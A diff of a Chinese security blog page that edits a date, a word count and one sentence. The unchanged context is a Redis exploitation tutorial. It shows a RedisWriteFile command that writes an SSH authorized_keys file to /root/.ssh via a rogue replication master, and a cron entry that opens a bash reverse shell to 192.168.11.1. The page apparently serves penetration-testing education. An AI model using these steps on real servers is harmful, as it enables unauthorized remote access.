@@ -435,7 +435,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-11-18
+                    2021-12-30
                 </div>
                 
 
@@ -730,7 +730,7 @@ CONFIG REWRITE                       <span aria-hidden="true" class="line-number
 <h3 id="主从复制无损写文件-master-slave模式"><a href="#主从复制无损写文件-master-slave模式" class="headerlink" title="主从复制无损写文件(master/slave模式)"></a>主从复制无损写文件(master/slave模式)</h3><p>Redis&gt;=2.8，支持主从复制功能，通过主从复制Redis-slave会将Redis-master的数据库文件同步到本地。攻击者可以伪造一个master，通过控制数据库文件可以在slave中写入无损的文件。利用命令来设置主服务器<code>SLAVEOF host port / REPLICAOF host port</code>(REPLICAOF &gt; 5.0.0) ，执行命令后的Redis身份会切换为从服务器，然后通过与主服务器交互进行数据同步，但是会导致目标Redis数据丢失，可以使用<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yanjieli/p/13085481.html">redis-dump</a>、redis-load等第三方工具进行数据备份导出，也可以在目标Redis上设置rdb、aof备份。利用 <a target="_blank" rel="noopener" href="https://github.com/r35tart/RedisWriteFile">RedisWriteFile</a> 脚本模拟master测试利用(需要网络互通,否则脚本会卡在从机连接位置)：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/44800dff8965ebaa84c88b226962fb81.png"></p>
 <h4 id="Linux写SSH公钥-1"><a href="#Linux写SSH公钥-1" class="headerlink" title="Linux写SSH公钥"></a>Linux写SSH公钥</h4><pre class="line-numbers language-python"><code class="language-python">python3 RedisWriteFile<span class="token punctuation">.</span>py <span class="token operator">-</span><span class="token operator">-</span>rhost <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">11.133</span> <span class="token operator">-</span><span class="token operator">-</span>rport <span class="token number">6379</span> <span class="token operator">-</span><span class="token operator">-</span>lhost <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">11.1</span> <span class="token operator">-</span><span class="token operator">-</span>lport <span class="token number">16379</span> <span class="token operator">-</span><span class="token operator">-</span>rpath <span class="token string">"/root/.ssh"</span> <span class="token operator">-</span><span class="token operator">-</span>rfile authorized_keys <span class="token operator">-</span><span class="token operator">-</span>lfile <span class="token punctuation">.</span><span class="token operator">/</span>SSH<span class="token operator">/</span>authorized_keys<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/85962012cf8bcebde873f98e9707d9eb.png"></p>
-<h4 id="Linux写计划任务-1"><a href="#Linux写计划任务-1" class="headerlink" title="Linux写计划任务"></a>Linux写计划任务</h4><p>Windows下编写计划任务文件注意<code>\r\n</code>换行要变成<code>\n\n</code>,Ubuntu计划任务文件尾行需要换行：</p>
+<h4 id="Linux写计划任务-1"><a href="#Linux写计划任务-1" class="headerlink" title="Linux写计划任务"></a>Linux写计划任务</h4><p>在Windows下编写Linux的计划任务文件注意<code>\r\n</code>换行要变成<code>\n\n</code>,Ubuntu计划任务文件尾行需要换行：</p>
 <pre class="line-numbers language-python"><code class="language-python">SHELL<span class="token operator">=</span><span class="token operator">/</span>bin<span class="token operator">/</span>bash
 PATH<span class="token operator">=</span><span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>sbin<span class="token punctuation">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>bin<span class="token punctuation">:</span><span class="token operator">/</span>sbin<span class="token punctuation">:</span><span class="token operator">/</span>bin<span class="token punctuation">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token punctuation">:</span><span class="token operator">/</span>usr<span class="token operator">/</span>bin
 <span class="token operator">*</span> <span class="token operator">*</span> <span class="token operator">*</span> <span class="token operator">*</span> <span class="token operator">*</span> root bash <span class="token operator">-</span>i <span class="token operator">></span><span class="token operator">&amp;</span> <span class="token operator">/</span>dev<span class="token operator">/</span>tcp<span class="token operator">/</span><span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">11.1</span><span class="token operator">/</span><span class="token number">6667</span> <span class="token number">0</span><span class="token operator">></span><span class="token operator">&amp;</span><span class="token number">1</span>
@@ -1430,7 +1430,7 @@ system<span class="token punctuation">.</span><span class="token keyword">exec</
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">36.8k</span>&nbsp;字
+                class="white-color">37.8k</span>&nbsp;字
             
             
             
